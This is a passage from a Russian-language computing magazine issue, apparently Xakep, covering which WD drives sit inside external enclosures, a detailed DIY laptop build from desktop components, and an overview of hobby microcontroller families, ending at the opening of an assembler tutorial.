иначе. Нет сомнений, что WD повторно использует одну и ту же аппаратную
платформу для производс тва дисков раз ных серий начиная от HGST Ultrastar
DC, WD Red Pro, WD Red и WD Purple до «белых» дисков, которые устанав‐
ливаются в пластиковые корпуса. Несмотря на использование одной и той же
платформы, уровень шума и производительность моделей Ultrastar DC и WD
Red Pro выше, чем у моделей WD Red и «белых» дис ков (которые между
собой практически не отличаются). С чем это может быть свя зано?
   Здесь мы ступаем на тонкий лед слухов и спекуляций. С одной стороны,
потребительские диски могут использовать ровно ту же механику, что их
более дорогие собратья. Об этом говорят уникальные идентификаторы Regu‐
latory Number (нор мативные номера), которые наз начаются государствен‐
ными органами сертифика ции продукции. Если у дисков с раз ными этикет‐
ками  (и разными идентификатора ми моделей) совпадают нормативные
номера, то на физическом уровне это одни и те же продукты. Далеко не пол‐
ный список соответствия номеров моделей и Regulatory Numbers приведен
ниже (источник):
 • WD80PURX = R/N US7SAJ800
 • WD81PURZ = R/N US7SAN8T0
 • WD80EMAZ = R/N US7SAL080
 • WD80EZAZ = R/N US7SAL080
 • WD80EZZX = R/N US7SAJ800
 • WD80EFAX‐68KNB0 = R/N US7SAN8T0 (атмосферная модель на плат‐
  форме Ultrastar DC HC320)
 • WD80EFAX‐68LHPN0 = R/N US7SAL080 (гелиевая модель на платформе
    Ultrastar DC HC510)
 • WD80EFZX = R/N US7SAJ800
 • WD100EMAZ = R/N US7SAL100
 • WD101PURZ = R/N US7SAL100
 • WD101KRYZ = R/N US7SAL100
 • WD120EDAZ = R/N US7SAM120
 • WD120EFAX = R/N US7SAM120
 • WD120EFMZ = R/N US7ASP140
 • WD120EMAZ = R/N US7SAM120
 • WD121KRYZ = R/N US7SAM120
 • WD121PURZ = R/N US7SAM120

По   соответствующему   нормативному   номеру   легко   определить
модель‐донора. К примеру, популярная современная модель WD80EZAZ
из корпуса WD My Book с нормативным номером US7SAL080 пос троена
на платформе Ultrastar He10‐8 SATA, которая была впоследствии переиме‐
нована в Ultrastar DC HC310. А вот более старая модель WD80EZZX имеет
нормативный номер US7SAJ800, что идентифицирует платформу как Ultrastar
He8‐8 SATA — не самый интерес ный вари ант.
  Обрати внимание на строку WD120EFMZ = R/N US7ASP140. На рынке при‐
сутствует несколько моделей внешних дисков WD объ емом 12 Тб. Интересно
то, что в некоторых из них исполь зуются те же диски, которые идут в 14‐
терабайтные модели — с огра ничением на уровне прошивки. Вероятно, эти
диски не прошли отбор на повышен ную емкость и были использованы ком‐
панией таким вот образом.
  Почему же все‐таки так сильно отличаются производительность и уровень
шума? Здесь можно строить лишь теории. Одна из них — отбор в процес се
технического контроля. Согласно этой теории, хорошие диски получают лей‐
бл Ultrastar; те, что похуже, идут на бюджетные линейки WD Red, а те, что
еще немного похуже — во внешние корпуса. Проб лема с этой теорией в том,
что продажи внешних накопителей превыша ют продажи всех остальных
категорий дисков в разы, если не на порядок. У WD настолько огромный про‐
цент брака? Чрезвычайно сомнитель но.
  Другая теория: WD устанавлива ет во внешние корпуса восстановленные
диски. Но опять же — отку да у компании такое количество восстановленных
дисков, особенно с учетом низкой ремонтопри годности напол ненных гелием
моделей?
   Лично мне более убедитель ной кажет ся теория, в которой присутствует
отбор в процессе техничес кого контроля, а более тихими (и более медленны‐
ми) диски становятся из‐за нас троек в прошивке, аналогичным ушед шей
в прошлое системе AAM (Automatic Acoustic Management) образом.


          WD80EFAXЗагадочный
В таблице выше ты мог заметить два разных диска с оди наковой первой
частью идентификатора модели: WD80EFAX‐68KNB0 и WD80EFAX‐68LHPN0.
Это два варианта диска WD Red 8TB. Покупая диск этой модели (а также диск
в корпусе, например, WD80EMAZ), ты можешь получить как модель, напол‐
ненную гелием (7 пластин) и основанную на платформе Ultrastar DC HC510
(бывшая He10), так и атмосферный диск с пятью «блинами», основанный
на платформе Ultrastar DC HC320. С одной стороны, отличия очевидны прос‐
то по внешнему виду, но если диск находится внутри корпуса, а разбирать
лень,   то   придется   смотреть   на   наличие   атрибута   S.M.A.R.T.
под номером 22 — Helium Level (изна чально равен 100). Если атрибут 22 при‐
сутствует — внутри гелий, нет — воздух.
   Какой вариант предпочесть? Атмосферный вари ант более горячий и шум‐
ный, но у какого из них будет выше надежность в долговременной перспек‐
тиве — неизвестно. Атмосферный вариант обходится дешевле в производс‐
тве (меньше число пластин, вентилиру емый дизайн).





                        Гелиевый диск слева





ИТОГ
Внешний диск — это кот в мешке, а его покупка — лотерея. В этой статье я
попытался пролить свет на то, что ты можешь обна ружить внутри пластиково‐
го корпуса. Надеюсь, эта информация поможет тебе принять информирован‐
ное решение.
ТРЮКИ

      НОУТБУК
      СВОИМИ
      РУКАМИ

          ВЫБИРАЕМ КОМПЛЕКТУЮЩИЕ
                     И СОБИРАЕМ
         ПРОИЗВОДИТЕЛЬНЫЙ ЛЭПТОП





                                                                           Jaw
                                                                                                   big‐jaw@mail.ru




Ты  решил  приобрести  произво дительный  портативный
компьютер, но смотришь на цены и печалишь ся: мощь и пор‐
тативность одновременно — дорогое удовольствие. В этой
статье я рас скажу, как собрать портативный лэптоп из стан‐
дартных десктопных комплектующих своими руками, а так же
в чем плюсы  такого подхода. Свое детище  я  назвал
Truebook.


ПОЧЕМУ НЕЛЬЗЯ ПРОСТО КУПИТЬ МОЩНЫЙ НОУТБУК?
Для начала — в ноутбуки уста навливают мобильные процес соры с урезанным
TDP.


             INFO

                    TDP (Thermal Design Power) — это конструктивные
                        требования к теп лоотводу. Эта величина показы‐
                        вает максимальное количество тепла, которое
                      должна рассеивать система охлажде ния чипа.


Производители принимают величину TDP равной максимальной мощности,
которую потребляет чип. Потребля емую мощность проще измерить, и в конце
концов вся она будет рас сеяна в виде теп ла.
  Показатель TDP не равен энергопотреблению, хотя и свя зан с ним.
В большинстве случаев процес сор с более высоким значением TDP пот‐
ребляет энергию (и выделяет тепло) силь нее, чем с меньшим, но это спра‐
ведливо при сравнении продукции одного производите ля, например Intel
или AMD. Бывает, что чип AMD с заявленной мощностью в 95 Вт экономич‐
нее, чем Intel с 90 Вт.
  Давай срав ним характеристики нескольких мобильных и десктопных про‐
цессоров компании Intel. Возь мем процессор i5‐2500, который используется
в настольных компах, и i5‐2557M для ноутбуков.
  Сравнивать мы будем на сайте компании Intel. Как видишь, расчетная
мощность — она же TDP — у этих процессоров силь но отличается. У мобиль‐
ного i5‐2557M она равна 17 Вт, а у десктопного i5‐2500 — целых 95 Вт.
  Не зря инже неры занижают основные параметры процессоров: количес‐
тво ядер, частоту процес сора. Это позволя ет добиться снижения TDP.
Охлаждать процессор в тонком корпусе ноутбука станет намного проще.
  В заводских ноутбуках меня не устраивают не только слабые процессоры,
но и ограниченные воз можнос ти апгрейдить железо. Конечно, в более
дорогих игровых  ноутбуках можно обновить процессор, твердотельный
накопитель, оператив ную память и даже дискретную видеокарту, но зачас тую
лишь в пределах одного поколения процессоров. Не исключено, что через
несколько лет твой ноутбук уста реет и ты ничего не сможешь с этим поделать.
  Еще один недостаток заводских ноутбуков — матрица расположена
на фиксированном расстоянии от клавиатуры, и это можно исправить, только
подклю чив внешний монитор или клавиату ру.
  Все это привело меня к мысли собрать собственный ноутбук. Пусть он
не будет особенно тонким, дос таточно, чтобы можно было перевозить его
с места на место без особого тру да.


ПОДБОР КОМПЛЕКТУЮЩИХ
Я поставил перед собой три основные цели.
 1. Возможность пол ного апгрейда всех компонентов.
 2. Использование десктопных комплектующих.
 3. Поддержка стандартных комплектующих (материнских плат, матриц).

Поговорим о выборе каждого из компонентов.


Матрица
Поскольку гаджет планируется довольно мобильным, я решил, что матрица
должна быть ноутбучной. В ноутах используются матрицы с разными типами
разъемов. Рассмотрим основные.
 • Интерфейс LVDS — самый распростра ненный интерфейс для настольных
   мониторов и матриц ноутбуков. LVDS обес печивает более высокую про‐
   пускную способ ность, чем TMDS, поэтому фактичес ки стал стандартом
  внешнего интерфейса для современной панели LCD.
 • eDP (Embedded DisplayPort) — встро енный порт дисплея. Организация
  VESA признаёт его как стандарт. Нес мотря на полную совместимость циф‐
   рового  сигнала  с  внешним  DisplayPort, eDP  дополнен  функциями
   для использования внутри устройств (электропитание дисплея, час тота,
   уровень подсветки, управление буфером Panel Self‐refresh).


             INFO

                         Panel  Self‐refresh —  технология,  с помощью
                       которой дисплей отображает картинку, когда нет
                      видеосигнала, и меняет ее по требованию гра‐
                     фического процессора.


Еще eDP поддерживает интеграцию в видеосигнал допол нительных циф‐
ровых  пакетов,  что  позволяет  реализовать  на  плате  дис плея  другие
интерфейсы. Например, можно добавить микрофон, веб‐камеру, тач‐повер‐
хность, хаб USB. Это позволяет умень шить количес тво проводников в шлей‐
фе для подключения к системной плате и сократить стоимость деталей
и обслуживания.
  В отличие от LVDS в eDP снижено общее количес тво линий, необходимых
для передачи данных. И всё без потери качес тва и с контролем четкости!
  В ближайшие несколь ко лет, думаю, стандарт eDP вытеснит с рынка уста‐
ревший LVDS. Для нагляднос ти приведу таб лицу сравнения технических
характеристик интерфейсов.





                      Сравнение LVDS и eDP

Матрицы Full HD на интерфейсе eDP по цене намного ниже, чем c поддер‐
жкой LVDS. Это тоже необходимо учитывать, но для меня выбор оказал ся
не так прост.
  А пока что я остановился на диаго нали матрицы 15,6 дюйма.


Материнская плата
Теперь необходимо выбрать материн скую плату. Именно она будет диктовать
свои правила поддержки  (или ее  отсутствия) интерфейсных и прочих
не менее важных разъемов.





            Основные форм‐факторы материн ских плат

Чтобы выбрать материнскую плату, нужно определить ся с ее форм‐фактором.
Лучше всего к пятнадца тидюймовой мат рице подходят форматы mini‐ITX,
Mini‐STX и thin mini‐ITX.
 • Mini‐ITX подразумевает материнскую пла ту с раз мерами 170 × 170 мм
   и поддержкой десктопной ОЗУ. На таких платах есть 24‐пиновый разъем
   питания от стандартного бло ка питания ATX, а высота интерфейсных разъ‐
  емов составляет около 4 см.
 • Mini‐STX — доволь но новый форм‐фактор материнских плат. Существенно
   меньше по размеру, чем mini‐ITX, — 147 × 140 мм. К преимуществам мож‐
   но отнести и питание от внешнего блока питания 19 В. Недостаток: слоты
   оперативной памяти рас положены вертикально относительно платы, разъ‐
  емы на задней панели сделаны в два ряда, что увеличивает ее размеры.
   Их, конечно, можно выпа ять, но это про тиво речит изначальным требова‐
   ниям к универсальности.
 • Thin mini‐ITX — размер 170 × 170 мм, как и у mini‐ITX. Но в отличие от нее
   высота здесь — в один интерфейсный разъем. К тому же такая плата
  может питаться от внешнего бло ка питания 19  В. Мой выбор пал
   на материнскую плату ASRock H110TM‐ITX R2.0.





                     ASRock H110TM‐ITX R2.0

Одна из самых важных опций — должен быть разъ ем LVDS для подключения
матрицы.


Все остальное
Поскольку на выбранной материнской плате в наличии был только разъем
LVDS 40pin, то и матрицу я решил взять c таким же разъемом. Остановил ся я
на матрице Innolux N156B6‐L0B c диаго налью 15,6 дюйма.
  К процессору требований у меня было мень ше: лишь бы работал и был
мощнее мобильных.
  Оперативная память — планка SO‐DIMM DDR4, накопи тель — SSD Sata
M2 120 Гбайт.
  Для первой тестовой сборки это го хватило.


Кулер для процессора
Я изучил варианты сначала в местных магазинах, а позже — на «Алиэкспрес‐
се», но так и не нашел ничего подходящего.





В найденных вариантах меня не устраивало расположение радиатора и изгиб
тепловых трубок — я собирался помес тить материнскую плату в корпусе
таким образом, чтобы, во‐первых, разъемы были по правую сторону от поль‐
зователя, а во‐вторых, про цес сор располагал ся бы ближе к верхней грани
устройства. Так охлаждение будет более эффективным.
  В итоге мой выбор пал на процес сорный кулер Intel, модель BXHTS1155LP.





                                      Intel BXHTS1155LP





Шлейф LVDS для соединения матрицы ноутбука и материнской
платы
Изначально я предположил, что этот шлейф мож но позаимствовать у ноут‐
бука с идентичным разъемом LVDS. Я работал в сервисе, и через мои руки
ежедневно проходило множес тво ноутбуков, но меня пос тигло разочарова‐
ние. Прошло три года, преж де чем я нашел подходящий мне по распиновке
шлейф LVDS.
   Когда все комплек тующие были у меня, я принялся за моделирование кор‐
пуса.


СОЗДАНИЕ МАКЕТА
Изначально корпус задумывался в форме клас сического ноутбука: нижняя
часть с клавиатурой и основными ком плектующими — материнской платой,
накопителем и прочим, а верхняя — с матрицей и веб‐камерой. Соеди‐
нялись бы части с помощью петель.
  Далее были разработаны и подготовлены трехмерные модели для этого
варианта корпуса. Я планировал сделать его из металла.
  Модель нижней час ти корпуса из листового метал ла с отверстиями
в основании для крепления материнской платы, перфорированными отвер‐
стиями для вентиляции на передней гра ни. Сзади расположены площадки
для крепления петель матрицы.





Другая сборная модель нижней час ти корпуса с перфорациями для забора
воздуха на передней грани и креп лением для петель матрицы — на задней.





Модель верхней крышки для нижней час ти корпуса представляет собой лис‐
товой металл с пер форациями для встро енных динамиков и выемку для съем‐
ной беспроводной клавиатуры.
  В процессе я понял, что нужно полностью перерабаты вать и упрощать
модель корпуса: уменьшить корпусные детали и сократить подвижные узлы.
  Новая конструкция получилась довольно простой и легкой в изготовлении:
две основные пластиковые час ти, верхнюю и нижнюю, крепим к основанию
из алю миния, на него также прикрепляются все основные комплектующие,
а сверху кладем в пазы матрицу и также накрыва ем крышкой из листового
метал ла. По бокам, слева и спра ва, рас полага ются интерфейсные разъемы,
которые также прик рываем накладками.





                            Накладки

На верхней пластиковой части должна быть перфорация, которая занима‐
ет 80% места задней гра ни, на остальных 20% рас положе ны два отверстия
для съемных антенн Wi‐Fi, чтобы без проб лем можно было установить нап‐
равленную антенну.
  На нижней части по кра ям устроены перфорации для забора све жего воз‐
духа, на верхней грани по кра ям — перфорации и крепления для двух
динамиков, а по центру — отверстие под кноп ку диаметром 12 мм для вклю‐
чения и отключения экра на.





                    Задняя грань верхней час ти





                  Передняя грань нижней час ти





                          Вид снизу

Пластиковые части я изготовил на 3D‐прин тере, а метал лические вырезал
из листовой стали и алюминия.


СБОРКА
Дальше началась самая нудная часть: сборка этого «конструктора».


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

    НОУТБУК СВОИМИ
           РУКАМИ
         ВЫБИРАЕМ КОМПЛЕКТУЮЩИЕ И СОБИРАЕМ
                   ПРОИЗВОДИТЕЛЬНЫЙ ЛЭПТОП





Корпус
Когда у меня на руках были пластиковые детали корпуса, оставалось их обра‐
ботать вручную: удалить поддержки, выровнять углы, вкле ить резьбовые
вставки M3, что бы закреплять на них остальные части корпуса. Затем я пос‐
ледовательно примерял комплектующие и подпиливал напильником все, что
плохо стыковалось.





             Пример ка боковых интерфейсных разъемов





      Примерка боковых интерфейсных разъемов и верхней крышки





                  Пример ка материнской платы





  Изготовлен и установлен на свое место воз духовод для быстрого вывода
  горячего воздуха из корпуса





        Пример ка воздуховода и кулера — выставле ны идеально!





        Пример ка накладок для боковых интерфей сных разъ емов





        Пример ка накладок для боковых интерфей сных разъ емов





                      Пример ка мат рицы

После того как я убе дился в полной совместимости всех корпусных частей
и комплектующих, корпус был отправлен на порошковую покраску.





             Корпусные час ти пос ле порошковой покраски


Железо
Далее — первоначальная сборка железа в корпус. Заняла около девяти
часов.
  Для питания устрой ства я выбрал защищенный от влаги разъем с защел‐
кой, который подпаял к блоку питания от ноутбука.





Следующий этап — пайка про водов для кно пок и разъ емов USB. Также я под‐
клю чил картридер для карт памяти microSD.





Вот что получилось в итоге.





Итоговая конфигурация устройства

 • Про цессор: Intel Pentium G4400
 • Диаго наль матрицы: 15,6 дюйма
 • Опе ративная память: 4 Гбайт DDR4
 • Накопитель: SSD на 128 Гбайт
 • Адаптеры беспро вод ных сетей: AC 9260NGW 802.11a/b/g/n/ac, Blue‐
   tooth 5.0
 • Картридер: microSD
 • Масса: 3 кг
 • Раз меры: 380 × 240 × 38 мм





ВЫВОДЫ
На этом работа пока что закончена, но прос тор для улучшений здесь
огромный.
   Во‐первых, в соот ветствии с задум кой в моем «Тру буке» можно апгрей‐
дить практически все, начиная с матрицы и заканчивая антенной Wi‐Fi
или батареей. При желании можно даже полностью сменить платформу,
заменив материнскую плату и процес сор.
   Во‐вторых, можно усовершенство вать и дизайн, не меняя основные ком‐
плектующие. Например, умень шить габари ты корпуса за счет использования
slim‐матрицы и более плотной компоновки комплектующих.
   Если ты захочешь повторить мой про ект или модернизировать его, то 3D‐
модели, чертежи и комплектующие качай по ссылке. Большую часть ком‐
понентов можно найти на AliExpress.


        WWW

                     •Адаптер Wi‐Fi
                       •Тачскрин 15,6"
                     •Беспроводная slim Bluetooth‐клавиатура
                      •Кноп ка включения
                  •Механическая  беспроводная   Bluetooth‐кла‐
                          виатура
                      •Веб‐камера
                     •Контроллер заряда батареи
                     •Аккумуляторы 18650
                     •LVDS‐шлейф
                   •Динамики
                      •Разъем питания
                      •Кноп ка 12 мм
                      •Разъемы USB и аудио
                     •Продвинутый   кон троллер  заряда  батареи
                      openUPS
                    •Ин тересные материнские платы
 ТРЮКИ





  Владимир Мищенко
Электроника. Коты. Аниме.
vova.mischenko@icloud.com


 ТОТАЛЬНЫЙ
   МИКРОКОНТРОЛЬ

   КАКИЕ БЫВАЮТ МИКРОКОНТРОЛЛЕРЫ
     И КАК ВЫБРАТЬ ПОДХОДЯЩИЙ





 Мик роконтроллеры, как ты зна ешь, в современной жизни
 повсюду и контролируют работу самой разной бытовой тех‐
 ники и электроники. В последние годы они стали мощными
 и дешевыми, а средства разработки для них — простыми,
 поэтому их час то покупа ют в рамках увлечения сборкой
 собственных гаджетов. В этой статье я расскажу, какие
 бывают контроллеры и как их выбирать, если ты планируешь
 создать свое умное устройство.


              INFO

                      Микроконтроллер (Micro Controller Unit, MCU) —
                       микросхема, предназначен ная для управления
                          электронными устройствами.


  Определение выше что‐то напоминает... Ах да, микропроцессор! Эти два
  сложных (в сравнении с остальными) электронных компонента похожи. Они
  обрабатывают цифровую информа цию и выполняют программы. Но мик‐
  роконтроллер несколько интерес нее: он уже содержит оперативную память
  (RAM), постоянную память (ROM), память прог раммы (Flash) и некоторую
  встроенную перифе рию. С ним легче начать работать, ему не нужно много
  обвязки для функционирова ния.
   С появления в 70‐х годах первых микроконтроллеров необходимость
  в проектировании сложного устройства отпа ла. Дол гое вре мя монополию
  на их производство держала компания Motorola, но их продукция была
  дороговата для обывателей. Сейчас же американские компании теснят кон‐
  куренты из Азии, которые готовы осчас тливить каждого за чисто символичес‐
  кую сумму.
    Давай вместе попробу ем разоб рать ся в современном рынке микрокон‐
  троллеров. Замечу, что говорить мы будем толь ко о бюджетных и широко
  специализированных модельных линейках, то есть о тех, которые используют
  электронщики.


  PIC





                Логотип компании Microchip Technology

  Открывает наш парад компания Microchip Technology с серией PIC. Эти МК
  отличаются между собой раз рядностью (8/16/32), набором периферии и кор‐
  пусом чипа. Восьмибитные варианты же делятся на четыре семейства: base‐
   line, mid‐range, enhanced mid‐range и PIC18. Более подробная информация
  приведена в таблице.





  Также есть 16‐битные «пики» — PIC24F и DsPIC30/33F. Ну и 32‐битные —
  PIC32MX. Эти непонятные сочета ния букв и цифр — часть идентификатора
  чипа. То же, что и марки у машин. Нап ример, широко рас пространенный
  камень PIC16F628A расшифровывается так: семей ство PIC16F6 (Mid‐range),
  а остальная часть имени — ука затель на конкретный камень. У рассмот‐
  ренных далее МК в име ни может содержать ся еще больше информации.





                   Микроконтроллер PIC16F628A

  Эти микроконтрол леры имеют среднюю  стоимость. Например, камень
  PIC6F628 в Chipdip стоит около 150 рублей, а PIC18F2550 — 620 рублей.


         WWW

                        Ассортимент PIC на Chipdip



  Более дешевые экземпляры имеют в сво ем составе минимум периферии.
  У упомянутого ранее PIC6F628 следующие характеристики: встроенный так‐
  товый генератор для работы с час тотой 4 или 8 МГц; 18 пинов, из них 16 —
  ввод/вывод, а 2 — питание; для работы на более высоких частотах можно
  подклю чить кварцевый резона тор; Flash‐память объемом 2048 слов; 4 ана‐
  логовых входа; два 8‐битных таймера и один 16‐битный; 224 бай та ОЗУ
  (самому смешно); 128 байт EEPROM (это программно перезаписы ваемая
  энергонезависимая память, вроде жесткого диска); интерфейс UART.


  Программирование и использование PIC
  Программируют для микроконтроллеров, как правило, на ассемблере и на
  Си. Есть множество сред разработки: MPASM и MPLAB, MicroC, JALedit (язык
  JAL, сам про него впервые слышу).


         WWW

                        Скачать MPLAB



  Как правило, на таких МК собира ют простень кие устройства вроде мигал ки
  или таймера. Эти контроллеры долго имели монополию на постсоветском
  пространстве, и в результате в интернете есть огромное множес тво русско‐
  язычных сервисов и ста тей, посвящен ных этим моделям МК. При сборке
  устройства часто можно даже не писать прошивку, ведь она легко находится
  в интернете, даже в нескольких вариантах.
    Вторым плюсом можно ука зать встро енные независимые (от тактового
  генератора) счетчики. Благода ря это му факту семейство зарекомендовало
  себя в качестве «мозгов» для час тотомеров. Пара таких контрол леров лежит
  у меня в мастерской на черный день. Из минусов можно выделить только
  высокую стоимость оригинальных программаторов, которые зовутся PICkit.





                                  PICKIT3

 В интернете есть множество ста тей по сборке достойных аналогов таких
  программаторов. Но вся соль в том, что для сборки программатора тебе нуж‐
  но что? Правильно, программа тор. На этот слу чай был разработан прог‐
  рамматор Громова. Для его сборки почти ничего не нужно, а работает он
  от COM‐порта компьютера. На момент его разработки популярность этой
  серии МК была высока, да и COM‐порты были у всех ПК. Сейчас все это уже
  редкость, так что придет ся преодо леть порог вхождения либо раскошелить‐
  ся.


 AVR





                      Логотип компании Atmel

  Микроконтроллеры AVR производит компания Atmel. Если не знал, это те
  самые контроллеры, из которых собира ют Arduino. Некогда Atmel была
  независимой компанией, но поз же ее купила упо мянутая ранее Microchip,
  которая продолжает выпускать эти МК. Они делятся на три семейства: tinyAVR
   (ATtinyxxx), megaAVR (ATmegaxxx), XMEGA AVR (ATxmegaxxx).


  TinyAVR
   • Flash‐память до 16 Кбайт;
   • RAM до 512 байт;
   • ROM до 512 байт;
   • число пинов (ножек) ввода‐вывода 4–18;
   • небольшой набор периферии.


 MegaAVR
   • FLASH до 256 Кбайт;
   • RAM до 16 Кбайт;
   • ROM до 4 Кбайт;
   • число пинов ввода‐вывода 23–86;
   • расширенная система команд (ассемблер) и перифе рии.


 XMEGA AVR
   • FLASH до 384 Кбайт;
   • RAM до 32 Кбайт;
   • ROM до 4 Кбайт;
   • четырехканальный контроллер DMA (для быстрой работы с памятью и вво‐
     дом/выводом);
   • «инновационная» система обра бот ки событий.

  Как и в случае PIC, у моделей AVR в наз вании содержится ценная информа‐
  ция. Например: ATMega328PU — семейство megaAVR, 32 Кбайта Flash, 8‐
  битный, P — говорит о модификации (примерно как у пистолета Макарова
  модернизированного — ПММ).





                      Рас шифровка названия чипа


  Цена и начинка
  Эти микроконтроллеры имеют, как и PIC, среднюю стоимость. Например,
  упомянутый  ранее  камень  ATmega328P  в  Chipdip  стоит  160  рублей,
  а ATxmega128A1 — 590 рублей.


         WWW

                      Микроконтроллеры Atmel в Chipdip



  TinyAVR дешевле и проще своих старших братьев. Немного характеристик AT‐
  mega328P: пре дельная  час тота работы 20 МГц  (слышал, правда,  что
  под охлаждением и посиль нее раз гоняли); 23 пина ввода‐вывода; Flash‐
  память на 32 Кбайта; 8 ана логовых входов; два 8‐битных тай мера и один 16‐
  битный; 6 ШИМ‐каналов; 2 Кбайта RAM; 1 Кбайт EEPROM; интерфейсы UART,
  SPI, I2C.


  Программирование и использование AVR
  Благодаря распространению плат про тоти пиро вания Arduino, как у нас, так
  и за рубежом, эти МК имеют низкий порог вхождения. Программируются
  на ассемблере, Си, C++; можно вос пользовать ся графичес кими генератора‐
  ми кода типа Scratch (см. Scratchduino). Для работы есть Atmel Studio, IAR
  AVR, WinAVR. Ну и Arduino IDE, куда уж без нее. Лично я использую связку
  из Geany и avrdude. Для про шивки есть большое раз нообразие программа‐
  торов: как дешевые, так и подороже. Я для этих целей прикупил недорогой
  экземпляр USBasp где‐то за 1,5 доллара (на Aliexpress есть масса вари‐
  антов). А можно в качестве программа тора использовать и Arduino UNO.
    Информации об этих контроллерах в интернете много: чего только стоит
  канал AlexGyver! И благодаря Arduino сущес твует масса обучающих наборов
  на любой вкус. В общем, низкий порог вхождения — весомый плюс этих кон‐
  троллеров.
     Кстати, если заказываешь из Китая, то взять пла ту с чипом будет дешевле,
  чем чип отдельно.


 ARM
 О компании ARM и ее продукции ты наверняка слышал. Однако производит
  эта компания не сами микроконтроллеры, а лишь архитектуру. Лицензию
  на нее покупают конечные производители и используют так, как им захочется.
  Кто только их не выпускал! Но как микроконтроллеры наибольшее рас‐
  пространение получили чипы компании STMicroelectronics.





                     Логотип STMicroelectronics

  Они делятся на два семейства: STM32 и STM8. Как понятно из названий,
  такие чипы бывают 8‐ и 32‐битные. А каждое семейство делится на серии,
  которых достаточно много.


 STM8
  Что можно о них сказать? Это функциональный аналог AVR, только дешевле.
  Здесь есть три серии: STM8L c ультранизким энергопотреблением, STM8S
  для индустриальной аппарату ры и STM8A, именуемые «высоконадежными».
  Периферия у всех такая же, как у AVR, но есть встро енный тактовый генера‐
  тор. Из плюсов могу выделить только низкое энергопотребление и маленькую
  цену. Замечу, у STM8 архитектура не ARM, а собственная. Она очень схожа
  с ARM и использует идентичный STM32 интерфейс прошивки. Компилятор
  для них используется тоже один, и при его работе ты просто указываешь,
  под какую архитектуру собирать код.


 STM32
  Проще говоря, это старший брат STM8. Его характерис тики куда выше
  и колеблются в больших пределах в зависимости от серии. Программируются
  практически на чем угодно, даже JavaScript, хотя я бы не рекомендовал.


  Прошивка и программирование
  Прошиваются STM32 с помощью раз работанного компанией ST интерфейса
  Single Wire Interface Module (SWIM). Еще у МК этой серии есть интерфейс
  отладки Serial Wire Debugging (SWD). Им я не пользовался, но в большинстве
  гайдов по STM есть описание его нас тройки.
    А еще на STM можно записывать прошивки по USB. Дело в том, что у мно‐
  гих контроллеров этой серии есть аппа рат ная поддержка USB. STM благода‐
  ря этому может эмулировать разные устройства — например, флешку. Если
  залить специальную прошивку, можно будет обновлять встроенную прог‐
  рамму просто по USB.
    Для STM32 есть самые разные программаторы — от весьма крутых
  до простеньких USB‐свистков. Я, например, взял ST‐LINK, на «Алиэкспрес се»
  он стоил около 1,6 дол ларов. Его дос тоинство в том, что он может прошить
  любой контроллер STM.





                        Программа тор ST‐LINK

  Стоит также упомянуть пла ты STM Nucleo. Вот одна из них.





                        Плата STM32 Nucleo

  Это что‐то вроде Arduino из мира STM. Стоит дорого вато, как и оригинальные
  Arduino, но вещь для новичка отличная. Если день ги есть, стоит взять. Здесь
  же стоит упомянуть «Амперку» с их «Искрой» и набором для начинающих.
  Тоже вполне достой ный выбор для первого раза.





                           Плата Iskra JS

  Для программирования можно вос пользовать ся средами Embedded Work‐
  bench, uVision и TrueStudio. Благодаря работе умель цев для этих же целей
  можно использовать и родной для многих Arduino IDE. Есть также онлайновый
  IDE — mbed studio.


  Цена
  Партия из пяти плат с обвязкой и STM8 будет стоить около 4,5 долларов. Пла‐
  та BluePill с STM32F103 сейчас стоит 1,6 доллара. Плата NUCLEO‐F072RB —
  16,4 доллара. Ссылок давать не буду — на «Алиэкспрес се» все это легко
  ищется по запросу «stm32».

  Статьи в «Хакере» об STM32 и проектах на его основе

   • BearSSL и STM32. Как реализовать шифрование для самодельного гад‐
     жета
   • В поисках случайности. Ищем энтропию на микросхеме, чтобы повысить
     стойкость шифров
   • Мейкерство на максималках. Заводим и раз гоняем оперативную память
     на STM32 и Arduino
   • Без слежки и закладок. Как собрать свой мобильник и почему это проще,
    чем кажется
   • MP3‐плеер сво ими руками. Как соб рать и зап рограммировать гаджет
     у себя дома
   • ZetaSDR. Собираем программно определяемый радиоприемник своими
     руками
   • Утиные истории. Делаем свой ана лог Rubber Ducky с беспроводной
    связью
   • Собираем GPS‐радар на базе STM32F3DISCOVERY и u‐blox Neo‐6M




 ESP





                             ESP32

  И, наконец, пара слов про ESP. С этими МК я не работал и знаю о них нем‐
  ного. Это 32‐битные камни с модулем Wi‐Fi на борту. Они используют архи‐
  тектуру xtensa. На них собира ют умные дома и прочие интересные шту ки
  (смотри врезку ниже). Программировать мож но опять же в Arduino IDE. Зна‐
  менитая ESP8266, неоднократно упомяну тая на страницах «Хакера», как раз
  и относится к этому семейству. К нему же относится ESP32, старший брат
  ESP8266.

  Статьи в «Хакере» о ESP32 и ESP8266

  ESP32
   • JavaScript для умного дома. Arduino уста рел, да здравству ет ESP32!
   • Ваяем сниффер на ESP32. Слу шаем вайфай, прицеливаемся на блютус!
   • Взламываем ESP32 раз и навсегда. Извлечение ключей флеш‐шиф‐
    рования и безопасной загрузки


  ESP8266
   • Прыжок в облако. Стро им бюджетное решение для интерне та вещей
     на NodeMCU + Azure IoT Hub
   • Волк   в   овечьей  шкуре.  Создаем  поддельную   точку  доступа
     на ESP8266 для сбо ра паролей
   • Гаси волну! Выбираем и нас тра иваем аппаратный деаутентификатор Wi‐Fi
     на ESP8266




 ВЫВОДЫ
  Кроме упомянутых выше производителей есть много других: Intel, Renesas
  Electronics,  Texas  Instruments  и  прочие. Но  в  сообществе  электрон‐
  щиков‐любителей они не прижились, хоть и активно используются в промыш‐
  ленности.
    Новичкам я рекомендую AVR в виде Arduino: по нему много информации
  на русском, а порог вхождения невелик. Но засиживаться на них не стоит, а то
  так и будешь до конца дней собирать и пересобирать этот конструктор.
    После Arduino стоит перейти на STM. Для простеньких проектов бери
  восьмибитные чипы, для более слож ных — 32‐битные, и будет тебе счастье.
 И помни, что микроконтроллер — это уже не процессор, но еще не компь‐
  ютер.
 КОДИНГ





                                                                                   Антон Карев
                                                                                      Эксперт по информационной
                                                                                            безопасности. Область
                                                                                       профессиональных
                                                                                       интересов — технологическая
                                                                                            разведка, аналитика в сфере
                                                                         ИБ и искусственный
                                                                                                    интеллект
                                                                                                vedacoder@mail.ru





ПОГРУЖЕНИЕ В
ASSEMBLER
 ДЕЛАЕМ ПЕРВЫЕ ШАГИ
 В ОСВОЕНИИ АСМА




 Ты решил освоить ассемблер, но не знаешь, с чего начать
